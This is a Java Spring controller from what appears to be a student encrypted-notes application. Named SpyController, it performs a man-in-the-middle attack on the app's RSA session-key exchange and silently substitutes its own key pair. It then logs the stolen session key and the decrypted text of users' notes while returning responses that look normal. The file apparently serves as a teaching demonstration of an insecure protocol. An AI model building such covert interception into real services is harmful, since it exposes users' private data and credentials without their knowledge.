package bsu.pischule.encryptednotes.controller;

import bsu.pischule.encryptednotes.dto.EncryptedNoteResponse;
import bsu.pischule.encryptednotes.dto.SessionKeyRequest;
import bsu.pischule.encryptednotes.dto.SessionKeyResponse;
import bsu.pischule.encryptednotes.service.EncryptionService;
import lombok.AllArgsConstructor;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import org.bouncycastle.openssl.jcajce.JcaPEMWriter;
import org.springframework.web.bind.annotation.*;

import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import java.io.IOException;
import java.io.StringWriter;
import java.security.KeyPair;
import java.security.PublicKey;
import java.util.*;

@Slf4j
@CrossOrigin
@AllArgsConstructor
@RestController
public class SpyController {
    private final EncryptionService encryptionService;
    private final SessionKeyController sessionKeyController;
    private final EncryptedNoteController encryptedNoteController;

    private static final Map<UUID, byte[]> keys = new HashMap<>();

    @SneakyThrows
    @PostMapping("/api/session-key/")
    public SessionKeyResponse spy(@RequestBody SessionKeyRequest theirRequest) {
        PublicKey theirPublic = encryptionService.readPublicKey(theirRequest.publicKeyPem());
        KeyPair ourKeyPair = encryptionService.generateKeyRsa();

        SessionKeyRequest ourRequest = new SessionKeyRequest(
                theirRequest.username(), theirRequest.password(), toPEM(ourKeyPair.getPublic()));

        SessionKeyResponse actualResponse = sessionKeyController.getSessionKey(ourRequest);
        byte[] ourEncryptedSessionKey = actualResponse.encryptedSessionKey();
        byte[] decryptedSessionKey = encryptionService.decryptRsa(ourEncryptedSessionKey, ourKeyPair.getPrivate());
        byte[] theirEncryptedSessionKey = encryptionService.encryptRsa(decryptedSessionKey, theirPublic);

        SessionKeyResponse fakedResponse = new SessionKeyResponse(theirEncryptedSessionKey, actualResponse.sessionToken());

        keys.put(actualResponse.sessionToken(), decryptedSessionKey);

        log.info("SessionKey: {}", Base64.getEncoder().encodeToString(decryptedSessionKey));

        return fakedResponse;
    }

    @GetMapping("/api/note/")
    public List<EncryptedNoteResponse> getNotes(@RequestHeader("Authorization") UUID sessionToken) {

        List<EncryptedNoteResponse> theirEncryptedNotes = encryptedNoteController.getNotes(sessionToken);
        try {
            byte[] keyBytes = keys.get(sessionToken);
            SecretKey key = encryptionService.getSessionKey(keyBytes);

            log.info("notes of user with token: {}", sessionToken);
            theirEncryptedNotes.stream()
                    .map(n -> encryptionService.decryptAes(n.encryptedNote(), key, new IvParameterSpec(n.iv())))
                    .forEach(text -> log.info("note: {}", text));

        } catch (NullPointerException ignored) {
            log.info("unknown session token while spying on /api/note/: {}", sessionToken);
        }
        return theirEncryptedNotes;
    }

    public static String toPEM(PublicKey pubKey) throws IOException {
        StringWriter sw = new StringWriter();
        JcaPEMWriter pemWriter = new JcaPEMWriter(sw);
        pemWriter.writeObject(pubKey);
        pemWriter.close();
        return sw.toString();
    }
}
